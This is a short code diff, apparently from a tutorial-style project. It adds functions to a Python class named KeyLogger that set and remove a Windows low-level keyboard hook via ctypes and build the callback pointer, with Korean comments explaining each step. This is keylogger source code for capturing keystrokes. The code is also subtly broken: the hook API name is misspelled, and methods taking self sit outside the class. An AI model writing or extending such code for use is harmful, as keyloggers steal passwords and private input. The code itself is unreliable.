@@ -20,3 +20,28 @@ class KeyLogger:
         self.hooked = None
 # 훅을 설정하고 해제하는 기능을 가진 클래스를 정의 
 
+def installHookProc(self, pointer):
+    self.hooked = self.lUser32.SetWindowHookExA(
+        WH_KEYBOARD_LL,
+        pointer,
+        kernel32.GetModuleHandleW(None),
+        0)
+    if not self.hooked:
+        return False
+    return True
+
+# 훅 설정 함수 정의 : 훅을 설정함, 모니터링 이벤트는 키보드에 입력이며, 스레드로 설정
+
+def uninstallHookProc(self):
+    if self.hooked is None:
+        return
+    self.lUser32.UnhookWindowsHookEx(self.hooked)
+    self.hooked = None
+
+#훅 해제 함수 정의 : 시스템 부하에 영향을 미치기 때문에 반드시 해제가 필요함 
+
+def getFPTR(fn):
+    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
+    return CMPFUNC(fn)
+
+# 함수 포인터 도출 : 훅 프로시저를 등록하려면 함수의 포인터를 전달해야함 
